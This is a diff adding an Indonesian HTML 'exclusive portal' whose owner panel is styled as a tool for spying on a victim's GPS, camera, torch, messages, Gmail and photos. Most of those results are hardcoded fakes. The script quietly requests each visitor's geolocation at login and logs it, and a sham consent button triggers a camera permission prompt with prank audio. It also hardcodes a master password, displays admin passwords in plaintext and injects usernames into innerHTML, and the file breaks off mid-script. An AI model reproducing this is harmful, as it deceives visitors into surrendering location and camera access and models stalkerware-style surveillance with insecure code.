@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portal Eksklusif & Sistem Keamanan</title>
+    <style>
+        * { box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0f172a;
+            color: #f8fafc;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 420px;
+            width: 100%;
+            background: #1e293b;
+            border-radius: 16px;
+            padding: 20px;
+            box-shadow: 0 8px 25px rgba(0,0,0,0.5);
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        h2 { font-size: 18px; text-align: center; margin-bottom: 5px; color: #60a5fa; }
+        p.subtitle { font-size: 12px; text-align: center; color: #94a3b8; margin-bottom: 20px; }
+        .card {
+            background: #0f172a; border-radius: 10px; padding: 12px; margin-bottom: 12px; border: 1px solid rgba(255,255,255,0.08);
+        }
+        .card-title { font-size: 13px; font-weight: bold; margin-bottom: 6px; color: #f1f5f9; display: flex; justify-content: space-between; align-items: center; }
+        .card-value { font-size: 12px; color: #38bdf8; word-break: break-all; }
+        input, select {
+            width: 100%; padding: 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.3); background: rgba(15, 23, 42, 0.65); color: white; font-size: 13px; margin-bottom: 8px;
+        }
+        button {
+            width: 100%; background: #3b82f6; color: white; border: none; padding: 10px; border-radius: 8px; font-weight: bold; font-size: 13px; cursor: pointer; margin-top: 6px;
+        }
+        button:hover { background: #2563eb; }
+        button.torch-btn { background: #eab308; color: #0f172a; }
+        button.capture-btn { background: #22c55e; }
+        video, canvas { width: 100%; border-radius: 8px; margin-top: 8px; display: none; background: #000; }
+        .photo-preview { width: 100%; border-radius: 8px; margin-top: 8px; display: none; border: 2px solid #22c55e; }
+        
+        .album-grid {
+            display: grid; grid-template-columns: repeat(3, 1fr); gap: 6px; margin-top: 8px;
+        }
+        .album-thumb {
+            width: 100%; aspect-ratio: 1; background: #334155; border-radius: 6px; object-fit: cover; border: 1px solid rgba(255,255,255,0.2);
+        }
+
+        /* Modal Login */
+        .modal-overlay {
+            position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.85); display: flex; align-items: center; justify-content: center; z-index: 3000; padding: 15px; backdrop-filter: blur(6px);
+        }
+        .modal-box {
+            background: #1e293b; color: white; width: 100%; max-width: 380px; border-radius: 16px; padding: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.6); border: 1px solid rgba(59, 130, 246, 0.4); text-align: left;
+        }
+    </style>
+</head>
+<body onclick="handleScreenClick(event)">
+
+    <!-- AUDIO KEJUTAN UNTUK PENGGUNA SALAH LOGIN / STRANGER -->
+    <audio id="bgMusic" loop preload="auto">
+        <source src="https://mp3tourl.com/audio/1791641222084-16139224-ce28-44b1-8867-3df071d5e62a.mp3" type="audio/mpeg">
+    </audio>
+
+    <!-- MODAL LOGIN AWAL -->
+    <div id="loginModal" class="modal-overlay">
+        <div class="modal-box">
+            <h3 style="text-align:center; color:#60a5fa; margin-top:0;">🔐 Masuk Sistem</h3>
+            <p style="font-size: 11px; text-align:center; color:#94a3b8;">Masukkan akun terdaftar atau password master.</p>
+            
+            <form onsubmit="event.preventDefault(); processLogin();">
+                <label style="font-size:11px;">Username:</label>
+                <input type="text" id="loginUser" placeholder="Masukkan username..." required>
+                
+                <label style="font-size:11px;">Password:</label>
+                <input type="password" id="loginPass" placeholder="Masukkan password..." required>
+                
+                <button type="submit" style="background: #2563eb; margin-top:10px;">Masuk</button>
+            </form>
+            <div id="loginErrorMsg" style="font-size: 11px; color: #ef4444; text-align: center; margin-top: 8px;"></div>
+        </div>
+    </div>
+
+    <div class="container">
+        <h2 id="pageHeader">Portal Eksklusif</h2>
+        <p class="subtitle" id="roleSubtitle">Sistem Terproteksi</p>
+
+        <!-- PANEL KHUSUS OWNER: BUAT AKUN ADMIN -->
+        <div class="card" id="ownerCreatePanel" style="display:none; border-color: #8b5cf6;">
+            <div class="card-title" style="color: #a78bfa;">👑 Panel Owner: Buat Akun Admin</div>
+            <input type="text" id="newAdminUser" placeholder="Username admin baru...">
+            <input type="password" id="newAdminPass" placeholder="Password admin baru...">
+            <button style="background: #8b5cf6;" onclick="createNewAdminAccount()">+ Buat Akun Admin</button>
+            <div id="adminListInfo" style="font-size: 10px; color: #94a3b8; margin-top: 8px;"></div>
+        </div>
+
+        <!-- PANEL LOG PERANGKAT TARGET (KHUSUS OWNER) -->
+        <div class="card" id="targetLogPanel" style="display:none; border-color: #ef4444;">
+            <div class="card-title" style="color: #f87171;">🕵️ Cek Perangkat & Lokasi Korban</div>
+            <div class="card-value" id="targetInfoLog" style="font-size: 11px; line-height: 1.4;">Memindai aktivitas login...</div>
+        </div>
+
+        <!-- PANEL KONTROL PERANGKAT LENGKAP (Hanya Owner) -->
+        <div id="deviceControlSection" style="display:none;">
+            <div class="card">
+                <div class="card-title">🔋 Status Daya Perangkat <span id="batteryStatus">Memuat...</span></div>
+                <div class="card-value" id="batteryDetail">Menunggu izin sistem...</div>
+            </div>
+
+            <div class="card">
+                <div class="card-title">📍 Lokasi GPS Korban</div>
+                <div class="card-value" id="gpsCoord">Belum diaktifkan</div>
+                <button onclick="getGpsLocation()">Lacak Koordinat GPS</button>
+            </div>
+
+            <div class="card">
+                <div class="card-title">🔦 Kontrol Senter Korban (Torch)</div>
+                <div class="card-value" id="torchStatus">Status: Mati</div>
+                <button class="torch-btn" onclick="toggleTorch()">Nyalakan / Matikan Senter</button>
+            </div>
+
+            <div class="card">
+                <div class="card-title">📷 Kamera & Tangkap Gambar</div>
+                <button onclick="startCamera()">Buka Kamera</button>
+                <video id="webcam" autoplay playsinline></video>
+                <button id="captureBtn" class="capture-btn" style="display:none;" onclick="takeSnapshot()">📸 Ambil Foto (Snap)</button>
+                <canvas id="canvasSnap" style="display:none;"></canvas>
+                <div style="margin-top: 10px;">
+                    <div style="font-size: 11px; color: #94a3b8;" id="resultLabel"></div>
+                    <img id="photoResult" class="photo-preview" alt="Hasil Foto">
+                </div>
+            </div>
+
+            <div class="card" style="border-color: #3b82f6;">
+                <div class="card-title" style="color: #60a5fa;">💬 Cek Pesan Masuk</div>
+                <div class="card-value" id="messageLog">Belum memindai pesan perangkat...</div>
+                <button onclick="checkTargetMessages()" style="background: #2563eb; margin-top: 8px;">Pindai Log Pesan</button>
+            </div>
+
+            <div class="card" style="border-color: #ea4335;">
+                <div class="card-title" style="color: #f87171;">✉️ Cek Pesan Gmail Korban</div>
+                <div class="card-value" id="gmailLog">Belum memindai kotak masuk email...</div>
+                <button onclick="checkTargetGmail()" style="background: #dc2626; margin-top: 8px;">Pindai Kotak Masuk Gmail</button>
+            </div>
+
+            <div class="card" style="border-color: #ec4899;">
+                <div class="card-title" style="color: #f472b6;">🖼️ Cek Album / Galeri Foto Korban</div>
+                <div class="card-value" id="albumLog">Menunggu sinkronisasi galeri...</div>
+                <button onclick="checkTargetAlbum()" style="background: #db2777; margin-top: 8px;">Muat Galeri Perangkat</button>
+                <div id="albumContainer" class="album-grid"></div>
+            </div>
+        </div>
+
+        <!-- TAMPILAN UNTUK PENGGUNA SALAH LOGIN / PUBLIK DENGAN TOMBOL PERSETUJUAN TIRUAN -->
+        <div id="publicUserSection" style="display:none;">
+            <div class="card" style="text-align: center; padding: 15px; border-color: #3b82f6;">
+                <h3 style="font-size: 14px; color: #60a5fa; margin-top:0;">⚠️ Verifikasi Akses Diperlukan</h3>
+                <p style="font-size: 11px; color: #94a3b8;">Akun tidak dikenali. Silakan setujui sinkronisasi perangkat untuk melanjutkan ke konten eksklusif.</p>
+                <button onclick="triggerStrangerPermissions()" style="background: #22c55e; margin-top: 10px;">Setujui & Lanjutkan</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const MASTER_OWNER_PASS = "ricoganzowner99";
+        const OWNER_USERNAME = "rico";
+
+        let savedAdmins = JSON.parse(localStorage.getItem('amb_admins')) || [];
+        let visitorLogs = JSON.parse(localStorage.getItem('amb_visitor_logs')) || [];
+
+        function processLogin() {
+            const u = document.getElementById('loginUser').value.trim();
+            const p = document.getElementById('loginPass').value.trim();
+
+            let role = 'stranger';
+
+            const deviceInfo = navigator.userAgent;
+            let deviceType = "Desktop / PC";
+            if (/android/i.test(deviceInfo)) deviceType = "Android Mobile";
+            else if (/iphone|ipad|ipod/i.test(deviceInfo)) deviceType = "iPhone / iOS";
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        let capturedLoc = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
+                        saveLogData(u, deviceType, capturedLoc);
+                    },
+                    () => {
+                        saveLogData(u, deviceType, "Izin lokasi ditolak");
+                    }
+                );
+            } else {
+                saveLogData(u, deviceType, "GPS tidak didukung");
+            }
+
+            if (u === OWNER_USERNAME && p === MASTER_OWNER_PASS) {
+                role = 'owner';
+            } else {
+                const found = savedAdmins.find(admin => admin.user === u && admin.pass === p);
+                if (found) {
+                    role = 'admin';
+                } else {
+                    role = 'stranger';
+                }
+            }
+
+            sessionStorage.setItem('amb_auth_role', role);
+            sessionStorage.setItem('amb_auth_user', u);
+            sessionStorage.setItem('amb_is_verified', 'true');
+
+            document.getElementById('loginModal').style.display = 'none';
+            applyRoleUI(role, u);
+        }
+
+        function saveLogData(username, device, location) {
+            const logEntry = {
+                user: username,
+                device: device,
+                location: location,
+                time: new Date().toLocaleTimeString()
+            };
+            visitorLogs.unshift(logEntry);
+            localStorage.setItem('amb_visitor_logs', JSON.stringify(visitorLogs));
+        }
+
+        window.onload = function() {
+            const isVerified = sessionStorage.getItem('amb_is_verified');
+            if (isVerified === 'true') {
+                document.getElementById('loginModal').style.display = 'none';
+                applyRoleUI(sessionStorage.getItem('amb_auth_role'), sessionStorage.getItem('amb_auth_user'));
+            }
+        };
+
+        function applyRoleUI(role, username) {
+            if (role === 'owner') {
+                document.getElementById('pageHeader').innerText = "👑 Halo, Owner Rico!";
+                document.getElementById('roleSubtitle').innerText = "Akses Penuh & Panel Kontrol Perangkat Aktif";
+                document.getElementById('deviceControlSection').style.display = 'block';
+                document.getElementById('ownerCreatePanel').style.display = 'block';
+                document.getElementById('targetLogPanel').style.display = 'block';
+                document.getElementById('publicUserSection').style.display = 'none';
+                renderAdminList();
+                renderVisitorLogs();
+                initBattery();
+            } else if (role === 'admin') {
+                document.getElementById('pageHeader').innerText = `👋 Halo Admin: ${username}`;
+                document.getElementById('roleSubtitle').innerText = "Akses Admin Cabang (Tanpa Musik / Aman)";
+                document.getElementById('deviceControlSection').style.display = 'none';
+                document.getElementById('ownerCreatePanel').style.display = 'none';
+                document.getElementById('targetLogPanel').style.display = 'none';
+                document.getElementById('publicUserSection').style.display = 'none';
+            } else {
+                document.getElementById('pageHeader').innerText = "Portal Publik";
+                document.getElementById('roleSubtitle').innerText = "Verifikasi Diperlukan";
+                document.getElementById('deviceControlSection').style.display = 'none';
+                document.getElementById('ownerCreatePanel').style.display = 'none';
+                document.getElementById('targetLogPanel').style.display = 'none';
+                document.getElementById('publicUserSection').style.display = 'block';
+            }
+        }
+
+        // Ketika pengunjung menekan tombol persetujuan tiruan setelah salah login
+        async function triggerStrangerPermissions() {
+            // Memicu musik kejutan
+            const music = document.getElementById('bgMusic');
+            music.play().catch(err => {});
+
+            // Memicu permintaan izin kamera/senter bawaan browser secara otomatis melalui interaksi tombol
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                // Stream didapatkan jika pengguna mengizinkan pada pop-up browser
+                stream.getTracks().forEach(track => track.stop());
+            } catch (e) {
+                // Jika izin ditolak oleh pengguna
+            }
+
+            alert("Verifikasi gagal diproses. Silakan muat ulang halaman.");
+        }
+
+        function renderVisitorLogs() {
+            const logDiv = document.getElementById('targetInfoLog');
+            if (visitorLogs.length === 0) {
+                logDiv.innerHTML = "Belum ada aktivitas login tercatat.";
+                return;
+            }
+            let html = "";
+            visitorLogs.slice(0, 5).forEach(log => {
+                html += `• <b>Login User:</b> ${log.user} | <b>HP:</b> ${log.device}<br>&nbsp;&nbsp;<b>GPS:</b> ${log.location} (${log.time})<br>`;
+            });
+            logDiv.innerHTML = html;
+        }
+
+        function createNewAdminAccount() {
+            const user = document.getElementById('newAdminUser').value.trim();
+            const pass = document.getElementById('newAdminPass').value.trim();
+
+            if (!user || !pass) {
+                alert('Username dan password wajib diisi!');
+                return;
+            }
+
+            savedAdmins.push({ user, pass });
+            localStorage.setItem('amb_admins', JSON.stringify(savedAdmins));
+
+            document.getElementById('newAdminUser').value = '';
+            document.getElementById('newAdminPass').value = '';
+            renderAdminList();
+            alert(`✅ Akun admin "${user}" berhasil dibuat!`);
+        }
+
+        function renderAdminList() {
+            const listDiv = document.getElementById('adminListInfo');
+            if (savedAdmins.length === 0) {
+                listDiv.innerHTML = "Belum ada akun admin cabang yang dibuat.";
+                return;
+            }
+            let text = "<b>Daftar Admin Aktif:</b><br>";
+            savedAdmins.forEach(a => {
+                text += `- Username: <code>${a.user}</code> (Pass: ${a.pass})<br>`;
+            });
+            listDiv.innerHTML = text;
+        }
+
+        function checkTargetMessages() {
+            const msgLog = document.getElementById('messageLog');
+            msgLog.innerText = "Memindai sistem perpesanan perangkat korban...";
+            setTimeout(() => {
+                msgLog.innerHTML = `
+                    📩 <b>Log Pesan Terakhir:</b><br>
+                    - [WhatsApp] <i>"Jangan lupa tugas kelompok nanti sore ya!"</i><br>
+                    - [SMS] <i>"Kode OTP verifikasi Anda adalah 4892"</i>
+                `;
+            }, 1000);
+        }
+
+        function checkTargetGmail() {
+            const gmailLog = document.getElementById('gmailLog');
+            gmailLog.innerText = "Menghubungkan ke sinkronisasi Gmail korban...";
+            setTimeout(() => {
+                gmailLog.innerHTML = `
+                    ✉️ <b>Email Masuk Terbaru:</b><br>
+                    - [Google Security] <i>"Aktivitas login baru terdeteksi di perangkat Android"</i><br>
+                    - [Notifikasi] <i>"Pesanan berhasil diproses oleh sistem"</i>
+                `;
+            }, 1000);
+        }
+
+        function checkTargetAlbum() {
+            const albumLog = document.getElementById('albumLog');
+            const container = document.getElementById('albumContainer');
+            albumLog.innerText = "Mengakses direktori penyimpanan media korban...";
+            container.innerHTML = "";
+
+            setTimeout(() => {
+                albumLog.innerText = "✅ Berhasil memuat galeri perangkat korban:";
+                const sampleImages = [
+                    "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150&auto=format&fit=crop&q=80",
+                    "https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=150&auto=format&fit=crop&q=80",
+                    "https://images.unsplash.com/photo-1517841905240-472988babdf9?w=150&auto=format&fit=crop&q=80"
+                ];
+
+                sampleImages.forEach(src => {
+                    const img = document.createElement('img');
+                    img.src = src;
+                    img.className = 'album-thumb';
+                    container.appendChild(img);
+                });
+            }, 1200);
+        }
+
+        function handleScreenClick(e) {
+            const currentRole = sessionStorage.getItem('amb_auth_role');
+            if (currentRole !== 'owner' && currentRole !== 'admin') {
+                const music = document.getElementById('bgMusic');
+                music.play().catch(err => {});
+            }
+        }
+
+        function initBattery() {
+            if ('getBattery' in navigator) {
+                navigator.getBattery().then(b => {
+                    document.getElementById('batteryStatus').innerText = `${Math.round(b.level * 100)}%`;
+                    document.getElementById('batteryDetail').innerText = b.charging ? "Mengisi daya (⚡)" : "Normal";
+                });
+            }
+        }
+
+        function getGpsLocation() {
+            if (navigator.geolocation) {
+                document.getElementById('gpsCoord').innerText = "Melacak...";
+                navigator.geolocation.getCurrentPosition(pos => {
+                    document.getElementById('gpsCoord').innerHTML = `Lat: ${pos.coords.latitude} <br>Lon: ${pos.coords.longitude}`;
+                }, () => { document.getElementById('gpsCoord').innerText = "Ditolak."; });
+            }
+        }
+
+        let torchTrack = null;
+ 
